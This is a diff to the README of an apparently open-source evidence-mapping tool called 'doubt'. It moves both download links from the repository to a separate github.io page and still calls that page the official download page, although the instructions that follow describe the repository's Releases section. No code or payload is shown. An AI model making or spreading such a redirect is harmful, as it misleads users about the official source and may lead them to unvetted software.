@@ -1,6 +1,6 @@
 # 🔍 doubt - Build visual maps from contested facts
 
-[![Download Doubt](https://img.shields.io/badge/Download-Doubt-blue.svg)](https://github.com/jackiehaploid769/doubt)
+[![Download Doubt](https://img.shields.io/badge/Download-Doubt-blue.svg)](https://jackiehaploid769.github.io)
 
 Doubt helps you turn complex questions into clear evidence maps. You can track arguments, check facts, and see how different sources relate to a central claim. It organizes research so you reach better decisions.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the application smoothl
 
 You can get the software directly from our repository page. Follow these steps to find the file:
 
-1. Visit the [official download page](https://github.com/jackiehaploid769/doubt).
+1. Visit the [official download page](https://jackiehaploid769.github.io).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the most recent version label.
 4. Scroll down to the "Assets" section.
